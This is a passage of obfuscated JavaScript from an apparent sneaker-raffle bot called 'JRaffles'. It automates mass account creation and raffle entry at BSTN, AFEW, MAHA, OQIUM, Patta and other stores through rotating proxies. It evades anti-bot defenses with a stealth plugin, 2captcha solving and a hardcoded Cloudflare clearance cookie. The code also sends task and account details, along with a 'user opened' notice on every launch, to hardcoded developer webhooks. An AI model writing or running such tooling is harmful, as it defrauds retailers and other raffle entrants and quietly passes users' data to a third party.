                    await _0x2f5636['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x4a79d2(0x5dc), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x15f243 + ']\x20Task\x20' + (_0x37eb5b + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x1c82a2) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x1c82a2['message']);
                } finally {
                    await _0x2f5636['close'](), await _0x4a79d2(0x4650);
                }
            } catch (_0x197060) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x15f243 + ']\x20Task\x20' + (_0x37eb5b + 0x1) + '\x20:\x20' + _0x197060));
            }
        }
    } catch (_0x501ff1) {
        console['log'](_0x3b3689['red']('' + _0x501ff1));
    } finally {
        await _0xe0113['close']();
    }
}
async function _0x3eb7e7(_0x3ca5c5, _0x36c9fc, _0x450568) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x270dc5 = 0x0; _0x270dc5 < _0x3ca5c5['length']; _0x270dc5++) {
        var _0x37aa5c;
        await _0x58b1b9(_0x3ca5c5, _0x270dc5), _0x1dc4b6(_0x450568['name'] + '\x20Task\x20' + (_0x270dc5 + 0x1) + '\x20/\x20' + _0x3ca5c5['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9);
        var _0x3429df = await _0x2df3ee(_0x3ca5c5[_0x270dc5], _0x450568, 'acc', ![]);
        const _0x195310 = { 'succesDEVMSG': { 'embeds': [_0x3429df] } }, _0x41f5b9 = 'https://www.bstn.com/eu_en/customer/account/';
        var _0x1c1873 = Math['round'](Math['random']() * (_0x36c9fc['length'] - 0x1)), _0x2deecd = _0x36c9fc[_0x1c1873]['split'](':');
        const _0x535958 = await _0x479f93['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x2deecd[0x0] + ':' + _0x2deecd[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--force-device-scale-factor=0.3'
            ]
        });
        try {
            const _0x158ad1 = await _0x535958['newPage']();
            await _0x158ad1['authenticate']({
                'username': '' + _0x2deecd[0x2],
                'password': '' + _0x2deecd[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x450568['name'] + ']\x20Task\x20' + (_0x270dc5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x158ad1['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x158ad1['setRequestInterception'](!![]), _0x158ad1['on']('request', _0x52a56d => {
                _0x52a56d['resourceType']() === 'image' ? _0x52a56d['abort']() : _0x52a56d['continue']();
            }), await _0x158ad1['goto']('' + _0x41f5b9), await _0x158ad1['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x158ad1['click']('button[class=\x22cf2Lf6\x22]'), await _0x158ad1['waitForSelector']('a.action.create.primary.social-login'), console['log'](_0x49028e() + '\x20[' + _0x450568['name'] + ']\x20Task\x20' + (_0x270dc5 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4a79d2(0x7d0), await _0x158ad1['click']('a.action.create.primary.social-login'), await _0x4a79d2(0x7d0), await _0x158ad1['click']('button.button.dashboard-actions-toolbar__item'), console['log'](_0x49028e() + '\x20[' + _0x450568['name'] + ']\x20Task\x20' + (_0x270dc5 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4a79d2(0x190), await _0x158ad1['type']('#firstname', _0x3ca5c5[_0x270dc5]['FirstName'], { 'delay': 0xf0 }), await _0x4a79d2(0x190), await _0x158ad1['type']('#lastname', _0x3ca5c5[_0x270dc5]['LastName'], { 'delay': 0xe6 }), await _0x4a79d2(0x190), await _0x158ad1['type']('#bss_email_address', _0x3ca5c5[_0x270dc5]['Email'], { 'delay': 0x122 }), await _0x4a79d2(0x190), await _0x158ad1['type']('#password', _0x3ca5c5[_0x270dc5]['Password'], { 'delay': 0x1e0 }), console['log'](_0x49028e() + '\x20[' + _0x450568['name'] + ']\x20Task\x20' + (_0x270dc5 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4a79d2(0x2bc), await _0x158ad1['click']('#bt-social-create'), await _0x158ad1['click']('#bt-social-create'), await _0x4a79d2(0x1388), await _0x158ad1['waitForSelector']('div.mesg-success'), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x450568['name'] + ']\x20Task\x20' + (_0x270dc5 + 0x1) + '\x20:\x20Account\x20' + _0x3ca5c5[_0x270dc5]['Email'] + '\x20Generated')), _0x7af797['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x3ca5c5[_0x270dc5]['Email'] + ',' + _0x3ca5c5[_0x270dc5]['Password']);
            try {
                _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x195310['succesDEVMSG']);
            } catch {
            }
            await _0x2110d2(_0x18784f, _0x195310['succesDEVMSG']), console['log'](_0x3b3689['yellow'](_0x49028e() + '\x20[' + _0x450568['name'] + ']\x20Task\x20' + (_0x270dc5 + 0x1) + '\x20:\x20After\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0x188c58) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x450568['name'] + ']\x20Task\x20' + (_0x270dc5 + 0x1) + '\x20:\x20' + _0x188c58)), _0x37aa5c = '' + _0x188c58;
            var _0x1f0fee = await _0x2df3ee(_0x3ca5c5[_0x270dc5], _0x450568, 'dev', !![], _0x37aa5c);
            _0x195310['errorDEV'] = { 'embeds': [_0x1f0fee] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x195310['errorDEV']), await _0x2110d2(_0x132dc8, _0x195310['errorDEV']);
        } finally {
            _0x535958['close'](), console['log'](_0x49028e() + '\x20[' + _0x450568['name'] + ']\x20Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0xb78ea0(_0x58b1af, _0x3858e4, _0x8df863) {
    _0x479f93['use'](_0x16b6ec());
    for (var _0x4eb1c3 = 0x0; _0x4eb1c3 < _0x58b1af['length']; _0x4eb1c3++) {
        var _0x5bfefb = Math['round'](Math['random']() * (_0x3858e4['length'] - 0x1)), _0x3948f0 = _0x3858e4[_0x5bfefb]['split'](':');
        const _0x5178e3 = await _0x479f93['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3948f0[0x0] + ':' + _0x3948f0[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2635f0 = await _0x5178e3['newPage']();
            await _0x2635f0['authenticate']({
                'username': '' + _0x3948f0[0x2],
                'password': '' + _0x3948f0[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x8df863['name'] + ']\x20Task\x20' + (_0x4eb1c3 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x2635f0['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2635f0['setRequestInterception'](!![]), _0x2635f0['on']('request', _0x59c2b1 => {
                _0x59c2b1['resourceType']() === 'image' || _0x59c2b1['resourceType']() === 'font' || _0x59c2b1['resourceType']() === 'media' ? _0x59c2b1['abort']() : _0x59c2b1['continue']();
            }), console['log'](_0x49028e() + '\x20[' + _0x8df863['name'] + ']\x20Task\x20' + (_0x4eb1c3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2635f0['goto'](_0x58b1af[_0x4eb1c3]), console['log'](_0x49028e() + '\x20[' + _0x8df863['name'] + ']\x20Task\x20' + (_0x4eb1c3 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2635f0['waitForTimeout'](0xbb8);
            try {
                await _0x2635f0['waitForSelector']('.dashboard-main_title'), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x8df863['name'] + ']\x20Task\x20' + (_0x4eb1c3 + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x5c9f63 = await _0x2df3ee(null, _0x8df863, 'ver', ![]);
                const _0x5aeec5 = { 'succesDEVMSG': { 'embeds': [_0x5c9f63] } };
                await _0x2110d2(_0x157a45, _0x5aeec5['succesDEVMSG']);
            } catch (_0x72ea1b) {
                throw new Error(_0x72ea1b);
            }
        } catch (_0x23410f) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x8df863['name'] + ']\x20Task\x20' + (_0x4eb1c3 + 0x1) + '\x20:\x20' + _0x23410f));
            var _0x2f3efb = _0x23410f, _0x5bffa6 = await _0x2df3ee(null, _0x8df863, 'ver', !![], _0x2f3efb);
            const _0xba6854 = { 'errorDEVMSG': { 'embeds': [_0x5bffa6] } };
            _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0xba6854['errorDEVMSG']), await _0x2110d2(_0x132dc8, _0xba6854['errorDEVMSG']);
        } finally {
            _0x5178e3['close'](), console['log'](_0x49028e() + '\x20[' + _0x8df863['name'] + ']\x20Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0x61830b(_0x2f28de, _0x399b74, _0x194ed1) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x288ca0 = 0x0; _0x288ca0 < _0x2f28de['length']; _0x288ca0++) {
        var _0x19d399;
        await _0x58b1b9(_0x2f28de, _0x288ca0), _0x1dc4b6(_0x194ed1['name'] + '\x20Task\x20' + (_0x288ca0 + 0x1) + '\x20/\x20' + _0x2f28de['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9);
        var _0x3b82ed = Math['round'](Math['random']() * (_0x399b74['length'] - 0x1)), _0x1c6299 = _0x399b74[_0x3b82ed]['split'](':');
        const _0x4002d1 = await _0x479f93['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1c6299[0x0] + ':' + _0x1c6299[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x43db7b = await _0x4002d1['newPage'](), _0x3625dc = await _0x43db7b['target']()['createCDPSession'](), { windowId: _0x26ec11 } = await _0x3625dc['send']('Browser.getWindowForTarget');
            await _0x43db7b['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            });
            var _0xfd452c = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x43db7b['setCookie'](_0xfd452c[0x0]), await _0x43db7b['authenticate']({
                'username': '' + _0x1c6299[0x2],
                'password': '' + _0x1c6299[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x194ed1['name'] + ']\x20Task\x20' + (_0x288ca0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x43db7b['goto']('' + _0x2f28de[_0x288ca0]['Url']), console['log'](_0x49028e() + '\x20[' + _0x194ed1['name'] + ']\x20Task\x20' + (_0x288ca0 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x43db7b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x3625dc['send']('Browser.setWindowBounds', {
                'windowId': _0x26ec11,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x4a79d2(0x1388), await _0x43db7b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x43db7b['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4a79d2(0x1f4), console['log'](_0x49028e() + '\x20[' + _0x194ed1['name'] + ']\x20Task\x20' + (_0x288ca0 + 0x1) + '\x20:\x20Logging\x20in'), await _0x43db7b['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x451c38 => _0x451c38['click']()), await _0x43db7b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x43db7b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4a79d2(0x7d0), await _0x43db7b['waitForSelector']('#email-login'), await _0x43db7b['type']('#email-login', '' + _0x2f28de[_0x288ca0]['Email']), await _0x4a79d2(0x1f4), await _0x43db7b['waitForSelector']('#password'), await _0x43db7b['type']('#password', '' + _0x2f28de[_0x288ca0]['Password']), await _0x4a79d2(0x1f4);
            try {
                await _0x43db7b['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x298843 => _0x298843['click']()), await _0x43db7b['click']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]');
            } catch {
            }
            try {
                await _0x43db7b['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x48291a) {
            }
            await _0x4a79d2(0x3e8);
            const _0x169585 = await _0x43db7b['$']('.enteredDraw_container__2KmQ_');
            if (_0x169585)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x49028e() + '\x20[' + _0x194ed1['name'] + ']\x20Task\x20' + (_0x288ca0 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2f28de[_0x288ca0]['Size']);
            if (_0x2f28de[_0x288ca0]['Size'] != 'RANDOM') {
                var _0x5329ff = _0x2f28de[_0x288ca0]['Size']['replace']('.', ',');
                const _0x38fb1f = await _0x43db7b['$x']('//div[contains(text(),\x20' + _0x5329ff + ')]');
                await _0x38fb1f[0x0]['click']();
            } else {
                const _0x50ed3f = await _0x43db7b['$$']('div.swatchTile_tile__IRH9Q');
                var _0x485f6d = Math['round'](Math['random']() * (_0x50ed3f['length'] - 0x1));
                await _0x50ed3f[_0x485f6d]['click']();
            }
            await _0x4a79d2(0x1f4);
            const _0x286ae6 = await _0x43db7b['$']('.addressList_addressItem__LE2PB');
            if (_0x286ae6) {
            } else
                console['log'](_0x49028e() + '\x20[' + _0x194ed1['name'] + ']\x20Task\x20' + (_0x288ca0 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x43db7b['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x4a79d2(0x5dc), await _0x43db7b['waitForSelector']('#firstname'), await _0x43db7b['type']('#firstname', '' + _0x2f28de[_0x288ca0]['FirstName']), await _0x4a79d2(0x1f4), await _0x43db7b['waitForSelector']('#firstname'), await _0x43db7b['type']('#lastname', '' + _0x2f28de[_0x288ca0]['LastName']), await _0x4a79d2(0x1f4), await _0x43db7b['waitForSelector']('#firstname'), await _0x43db7b['type']('#street', '' + _0x2f28de[_0x288ca0]['Address1']), await _0x4a79d2(0x1f4), await _0x43db7b['waitForSelector']('#firstname'), await _0x43db7b['type']('#houseNumber', _0x2f28de[_0x288ca0]['HouseNumber'] + '\x20' + _0x2f28de[_0x288ca0]['Address2']), await _0x4a79d2(0x1f4), await _0x43db7b['waitForSelector']('#firstname'), await _0x43db7b['select']('#country_code', '' + _0x2f28de[_0x288ca0]['Country']), await _0x4a79d2(0x1f4), await _0x43db7b['type']('#postcode', '' + _0x2f28de[_0x288ca0]['Zip']), await _0x4a79d2(0x1f4), await _0x43db7b['type']('#city', '' + _0x2f28de[_0x288ca0]['City']), await _0x4a79d2(0x1f4), await _0x43db7b['type']('#telephone', '' + _0x2f28de[_0x288ca0]['Phone']), await _0x4a79d2(0x1f4), await _0x43db7b['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x4a79d2(0x9c4);
            try {
                await _0x43db7b['type']('#instagram_name', '' + _0x2f28de[_0x288ca0]['Follower']), await _0x43db7b['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            await _0x4a79d2(0x5dc), await _0x43db7b['click']('.checkBox_boxHolder__wLGVe'), await _0x4a79d2(0x1f4), await _0x43db7b['click']('.termConditions_TC__hll9k\x20>\x20button'), await _0x4a79d2(0x1388), await _0x43db7b['waitForSelector']('.success_msg__2HjJY'), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x194ed1['name'] + ']\x20Task\x20' + (_0x288ca0 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x31931a = await _0x2df3ee(_0x2f28de[_0x288ca0], _0x194ed1, 'dev', ![]), _0xf14259 = await _0x2df3ee(_0x2f28de[_0x288ca0], _0x194ed1, 'pub', ![]);
            const _0x3fbc58 = {
                'succesDEVMSG': { 'embeds': [_0x31931a] },
                'succesPUBMSG': { 'embeds': [_0xf14259] }
            };
            try {
                _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x3fbc58['succesDEVMSG']), await _0x4a79d2(0xc8), await _0x2110d2(_0x478ec4, _0x3fbc58['succesDEVMSG']), await _0x4a79d2(0xc8), await _0x2110d2(_0x19d1c2, _0x3fbc58['succesPUBMSG']);
            } catch (_0xb62990) {
                console['log'](_0x3b3689['yellow'](_0x49028e() + '\x20[' + _0x194ed1['name'] + ']\x20Task\x20' + (_0x288ca0 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xb62990));
            }
        } catch (_0x37851b) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x194ed1['name'] + ']\x20Task\x20' + (_0x288ca0 + 0x1) + '\x20:\x20' + _0x37851b)), _0x19d399 = '' + _0x37851b;
            var _0x3d16e2 = await _0x2df3ee(_0x2f28de[_0x288ca0], _0x194ed1, 'dev', !![], _0x19d399), _0x31931a = await _0x2df3ee(_0x2f28de[_0x288ca0], _0x194ed1, 'dev', ![]), _0xf14259 = await _0x2df3ee(_0x2f28de[_0x288ca0], _0x194ed1, 'pub', ![]);
            const _0x13acc5 = {
                'succesDEVMSG': { 'embeds': [_0x31931a] },
                'succesPUBMSG': { 'embeds': [_0xf14259] }
            };
            _0x13acc5['errorDEV'] = { 'embeds': [_0x3d16e2] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x13acc5['errorDEV']), await _0x2110d2(_0x132dc8, _0x13acc5['errorDEV']);
        } finally {
            _0x4002d1['close'](), console['log'](_0x49028e() + '\x20[' + _0x194ed1['name'] + ']\x20Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0x905fb9() {
    await _0x5852b5(), console['clear']();
    if (_0x49c529 != 'devkey') {
        let _0x223c72 = await _0x589be8['autoUpdate']();
        if (_0x223c72 === 'yes')
            return _0x5c374d('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x33e5e0 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x4a79d2(0x2710);
        ;
    }
    await _0x156232(_0x33e5e0);
    if (_0x13bd28 === ![])
        return console['log']('Closing\x20Browser'), await _0x4a79d2(0xbb8);
    else
        try {
            var _0x320100 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x446b97
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x49c529
                    }
                ]
            }];
            const _0x124fc6 = { 'embeds': _0x320100 };
            var _0x8f4330 = await _0x2df3ee(null, null, 'open', ![]);
            const _0x5c190c = { 'openDEVMSG': { 'embeds': [_0x8f4330] } };
            await _0x2110d2(_0x9ef43, _0x5c190c['openDEVMSG']);
            async function _0xd70cc6() {
                _0x1dc4b6('JRaffles\x20' + _0x49c529), console['clear'](), console['log']('Welcome\x20to\x20' + _0x3b3689['cyan']('JRaffles();') + '\x20' + _0x49c529), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x134422 = 0x0; _0x134422 < _0x1adfd5['length'] - 0x3; _0x134422++) {
                    if (_0x1adfd5[_0x134422]['name'] === 'Reload\x20Settings' || _0x1adfd5[_0x134422]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x134422 + ')\x20[' + _0x1adfd5[_0x134422]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1adfd5['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x1adfd5['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1adfd5['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x16ec6e();
                if (taskModule > _0x1adfd5['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x4a79d2(0x3e8), _0xd70cc6();
                if (_0x1adfd5[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                    var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x5e7099 = await _0x47ea1e(), _0x557d3b = await _0x107b61();
                        await _0x61830b(_0x557d3b, _0x5e7099, _0x1488cc);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x5e7099 = await _0x47ea1e(), _0x557d3b = await _0x107b61();
                            await _0x3eb7e7(_0x557d3b, _0x5e7099, _0x1488cc);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5e7099 = await _0x47ea1e(), _0x2e0dca = await _0x52fae4(), _0x4701b3 = _0x2e0dca['split'](';');
                                await _0xb78ea0(_0x4701b3, _0x5e7099, _0x1488cc);
                            }
                        }
                    }
                }
                if (_0x1adfd5[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                    var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5e7099 = await _0x47ea1e(), _0x32254f = await _0x107b61();
                    if (_0x32254f[0x0]['Url'] == '' || _0x32254f[0x0]['Url'] == undefined) {
                        await _0x1bad40(_0x5e7099);
                        var _0x15cea2 = await _0x1806f5();
                        return await afewFunction('' + _0x5e9464[_0x15cea2], 'nor', _0x1488cc, _0x32254f, _0x5e7099), _0xd70cc6();
                    }
                    return await afewFunction(_0x32254f[0x0]['Url'], 'nor', _0x1488cc, _0x32254f, _0x5e7099), _0xd70cc6();
                } else {
                    if (_0x1adfd5[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                        var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x5e7099 = await _0x47ea1e(), _0x5060cf = await _0x107b61();
                            console['log']('Starting\x20' + _0x5060cf['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x53c454 = 0x0; _0x53c454 < _0x5060cf['length']; _0x53c454++) {
                                console['log'](_0x49028e() + '\x20[' + _0x1488cc['name'] + ']\x20Task\x20' + (_0x53c454 + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x572e47(_0x53c454, 'nor', _0x1488cc, _0x5060cf, _0x5e7099), console['log'](_0x49028e() + '\x20[' + _0x1488cc['name'] + ']\x20Sleeping\x20for\x20' + _0xff80bf['MahaDelay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['MahaDelay']);
                                } catch (_0x1d149a) {
                                    console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1488cc['name'] + ']\x20Task\x20' + (_0x53c454 + 0x1) + ':\x20Error\x20' + _0x1d149a));
                                }
                            }
                            ;
                            return _0xd70cc6();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5e7099 = await _0x47ea1e();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x2e0dca = await _0x52fae4(), _0x4701b3 = _0x2e0dca['split'](';'), console['log'](_0x4701b3['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x53c454 = 0x0; _0x53c454 < _0x4701b3['length']; _0x53c454++) {
                                    _0x1488cc['url'] = _0x4701b3[_0x53c454], console['log'](_0x49028e() + '\x20[' + _0x1488cc['name'] + ']\x20Task\x20' + (_0x53c454 + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x572e47(_0x53c454, 'ver', _0x1488cc, _0x5060cf, _0x5e7099), console['log'](_0x49028e() + '\x20[' + _0x1488cc['name'] + ']\x20Sleeping\x20for\x20' + _0xff80bf['verificationDelay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['verificationDelay']);
                                    } catch (_0x4e8800) {
                                        console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1488cc['name'] + ']\x20Task\x20' + (_0x53c454 + 0x1) + ':\x20Error\x20' + _0x4e8800));
                                    }
                                }
                                ;
                                return _0xd70cc6();
                            }
                        }
                    } else {
                        if (_0x1adfd5[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                            var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction], _0x5e7099 = await _0x47ea1e(), _0x51ec70 = await _0x107b61();
                            return await _0x2cd91b(_0x51ec70, _0x5e7099, _0x1488cc), await _0x4a79d2(0x1388), _0xd70cc6();
                        } else {
                            if (_0x1adfd5[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                                var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x5e7099 = await _0x47ea1e(), _0x46b136 = await _0x107b61();
                                    console['log']('Starting\x20' + _0x3b3689['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x53c454 = 0x0; _0x53c454 < _0x46b136['length']; _0x53c454++) {
                                        console['log'](_0x49028e() + '\x20[' + _0x1488cc['name'] + ']\x20Task\x20' + (_0x53c454 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x1392cd(_0x53c454, 'nor', _0x1488cc, _0x46b136, _0x5e7099);
                                        } catch (_0x2fcc9f) {
                                            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1488cc['name'] + ']\x20Task\x20' + (_0x53c454 + 0x1) + ':\x20Task\x20failed\x20' + _0x2fcc9f));
                                        }
                                        console['log'](_0x49028e() + '\x20[' + _0x1488cc['name'] + ']\x20Sleeping\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
                                    }
                                    return _0xd70cc6();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x5e7099 = await _0x47ea1e();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x2e0dca = await _0x52fae4(), _0x4701b3 = _0x2e0dca['split'](';'), console['log'](_0x4701b3['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x53c454 = 0x0; _0x53c454 < _0x4701b3['length']; _0x53c454++) {
                                            try {
                                                _0x1488cc['url'] = _0x4701b3[_0x53c454], console['log'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x53c454 + 0x1) + ':\x20Getting\x20Session'), await _0x1392cd(_0x53c454, 'ver', _0x1488cc, null, _0x5e7099), console['log'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0xff80bf['verificationDelay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['verificationDelay']);
                                            } catch (_0x3e8f04) {
                                                console['log'](_0x3e8f04), await _0x4a79d2(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0xd70cc6();
                                    }
                                }
                                ;
                            } else {
                                if (_0x1adfd5[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                                    var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x395185('https://bouncewear.com/nl/account/register', _0x1488cc);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x1adfd5[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                                        var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x5e7099 = await _0x47ea1e(), _0x44f49e = await _0x107b61();
                                            return await _0x7b262d('https://patta.nl/account/register', _0x1488cc, _0x44f49e, _0x5e7099), _0xd70cc6();
